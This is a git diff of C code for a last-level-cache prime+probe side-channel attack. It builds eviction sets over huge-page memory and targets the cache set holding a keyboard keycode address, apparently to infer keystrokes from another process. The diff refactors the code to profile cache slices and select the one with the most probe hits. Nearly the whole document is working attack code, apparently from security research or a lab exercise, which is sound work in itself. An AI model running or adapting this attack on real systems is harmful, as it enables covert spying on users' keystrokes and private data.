@@ -147,14 +147,18 @@ void test_eviction_and_pp(void) {
   munmap(mapping_start, EVERGLADES_LLC_SIZE << 4);
 }
 
-void find_all_eviction_sets(int set) {
-  printf("set: %d\n", set);
+void init_mapping() {
   mapping_start = mmap(NULL, EVERGLADES_LLC_SIZE << 4, PROT_READ,
                        MAP_PRIVATE | MAP_ANONYMOUS | MAP_HUGETLB, -1, 0);
   if (mapping_start == MAP_FAILED) {
     perror("map");
     return;
   }
+}
+
+void find_all_eviction_sets(int set) {
+  printf("set: %d\n", set);
+
   es_list = get_all_slices_eviction_sets(mapping_start, set);
 
   for (int i = 0; i < 4; i++) {
@@ -176,19 +180,19 @@ int get_eslist_index_for_target(uintptr_t target) {
   return ret;
 }
 
-void prime_probe(int slice_idx) {
+int prime_probe(int slice_idx) {
   int threshold = threshold_from_flush((void *)es_list[slice_idx]->head);
 
   printf("prime+probe starts here: \n");
   sleep(3);
 
   int times[16];
-  uint8_t hit_times[1024 * 1024];
-  for (int i = 0; i < 1024 * 1024; i++)
+  uint8_t hit_times[128 * 128];
+  for (int i = 0; i < 128 * 128; i++)
     hit_times[i] = 0;
 
   printf("start time: %llu\n", __rdtscp(&core_id));
-  for (int i = 0; i < 1024 * 1024; i++) {
+  for (int i = 0; i < 128 * 128; i++) {
     prime_probe_once(es_list[slice_idx], times);
     for (int j = 0; j < 16; j++) {
       if (times[j] > threshold) {
@@ -198,50 +202,47 @@ void prime_probe(int slice_idx) {
     }
   }
 
+  int hit_count = 0;
   printf("prime+probe period ends\n");
   for (int i = 0; i < 64; i++) {
     for (int j = 0; j < 64; j++) {
-      printf("%d", hit_times[1024 * 1024 - 64 * 64 + i * 64 + j]);
+      printf("%d", hit_times[128 * 128 - 64 * 64 + i * 64 + j]);
+      hit_count += hit_times[128 * 128 - 64 * 64 + i * 64 + j];
     }
     printf("\n");
   }
+  return hit_count;
+}
+
+int profile_slices(int set) {
+  find_all_eviction_sets(set);
+  int slice_hit_count[4];
+  for (int i = 0; i < 4; i++) {
+    int slice = get_i7_2600_slice(pointer_to_pa((void *)es_list[i]->head));
+    printf("testing slice index: %d\n", slice);
+    sleep(1);
+    slice_hit_count[slice] = prime_probe(i);
+  }
+
+  int max_hit_count = slice_hit_count[0];
+  int max_slice_index = 0;
+  for (int i = 0; i < 4; i++) {
+    if (slice_hit_count[i] > max_hit_count) {
+      max_hit_count = slice_hit_count[i];
+      max_slice_index = i;
+    }
+  }
+  return max_slice_index;
 }
 
 int main() {
-  signal(SIGINT, handle_sigint);
   // test_eviction_set();
   // test_covert_channel();
   // test_eviction_and_pp();
+  signal(SIGINT, handle_sigint);
   int set = pa_to_set(KBD_KEYCODE_ADDR, EVERGLADES);
-  find_all_eviction_sets(set);
-  // CacheLineSet *cl_set =
-  //     hugepage_inflate(mapping_start + EVERGLADES_LLC_SIZE, 16, 428);
-  // volatile uint8_t tmp = *(volatile uint8_t *)mapping_start;
-  // for (int i = 0; i < cl_set->size; i++) {
-  //   for (int j = 0; j < 4; j++) {
-  //     int time =
-  //         evict_and_time_once(es_list[j], (uint8_t *)cl_set->cache_lines[i]);
-  //     printf("addr %d, slice %d: %d\n", i, j, time);
-  //   }
-  // }
-  // printf("prime+probe starts\n");
-  // sleep(1);
-  // nl = new_num_list(16);
-  int index = get_eslist_index_for_target(KBD_KEYCODE_ADDR);
-  printf("index: %d\n", index);
-  // while (1) {
-  //   // for (int i = 0; i < 4; i++) {
-  //   //   prime_probe_once(es_list[i], nl);
-  //   //   clear_num_list(nl);
-  //   // }
-  //   prime_probe_once(es_list[1], nl);
-  //   clear_num_list(nl);
-  // }
-
-  char filename[9];
-  for (int i = 0; i < 4; i++) {
-    printf("testing slice index: %d\n", i);
-    sleep(1);
-    prime_probe(i);
-  }
+  init_mapping();
+  int target_slice = profile_slices(set);
+  printf("target slice: %d\n", target_slice);
+  return 0;
 }
